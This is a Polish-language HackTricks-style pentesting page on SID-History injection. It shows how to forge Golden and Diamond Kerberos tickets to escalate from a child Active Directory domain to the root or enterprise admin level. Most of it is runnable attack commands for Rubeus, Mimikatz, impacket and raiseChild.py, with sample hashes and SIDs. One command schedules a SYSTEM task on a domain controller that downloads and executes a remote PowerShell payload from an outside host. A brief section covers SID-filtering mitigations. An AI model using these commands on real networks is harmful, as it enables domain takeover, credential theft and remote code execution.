# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Celem **SID History Injection Attack** jest ułatwienie **migracji użytkowników między domenami** przy jednoczesnym zachowaniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **dodanie poprzedniego Security Identifier (SID) użytkownika do SID History** jego nowego konta. Warto zauważyć, że proces ten może zostać wykorzystany do przyznania nieautoryzowanego dostępu poprzez dodanie SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny nadrzędnej do SID History. Takie wykorzystanie zapewnia dostęp do wszystkich zasobów w domenie nadrzędnej.<sup>[[1]](#references)[[2]](#references)</sup>

Istnieją dwie metody przeprowadzenia tego ataku: poprzez utworzenie **Golden Ticket** albo **Diamond Ticket**.

Aby ustalić SID grupy **"Enterprise Admins"**, należy najpierw znaleźć SID domeny głównej. Po jego zidentyfikowaniu można skonstruować SID grupy Enterprise Admins, dopisując `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, wynikowy SID grupy "Enterprise Admins" będzie wynosił `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Można również użyć grup **Domain Admins**, których SID kończy się wartością **512**.

Innym sposobem na znalezienie SID grupy z innej domeny (na przykład "Domain Admins") jest:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Pamiętaj, że możliwe jest wyłączenie SID history w relacji zaufania, co spowoduje niepowodzenie tego ataku.

Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Wyłączenie SIDHistory w ramach forest trusts** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Zastosowanie SID Filter Quarantining do external trusts** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Zastosowanie SID Filtering do domain trusts w ramach jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować breaking changes. Jeśli domena w lesie jest niezaufana, nie powinna być jego członkiem. W takiej sytuacji należy najpierw podzielić zaufane i niezaufane domeny na osobne lasy, w których można zastosować SID Filtering do interforest trust

Więcej informacji o bypassing tego mechanizmu znajdziesz w tym poście: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Ostatnim razem, gdy tego próbowałem, musiałem dodać argument **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Więcej informacji o golden tickets znajdziesz tutaj:


{{#ref}}
golden-ticket.md
{{#endref}}


Więcej informacji o diamond tickets znajdziesz tutaj:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Eskaluj uprawnienia do DA domeny root lub Enterprise admin, używając hasha KRBTGT przejętej domeny:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Dzięki uzyskanym uprawnieniom w wyniku ataku możesz na przykład wykonać atak DCSync w nowej domenie:


{{#ref}}
dcsync.md
{{#endref}}

### Z systemu Linux

#### Ręcznie za pomocą [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatycznie za pomocą [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Jest to skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:

- Docelowego kontrolera domeny
- Danych uwierzytelniających użytkownika administracyjnego w domenie podrzędnej

Przebieg:

- Pobiera SID grupy Enterprise Admins z domeny nadrzędnej
- Pobiera hash konta KRBTGT w domenie podrzędnej
- Tworzy Golden Ticket
- Loguje się do domeny nadrzędnej
- Pobiera dane uwierzytelniające konta Administrator w domenie nadrzędnej
- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referencje

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Czym jest Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Zagadnienia bezpieczeństwa dotyczące relacji zaufania - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
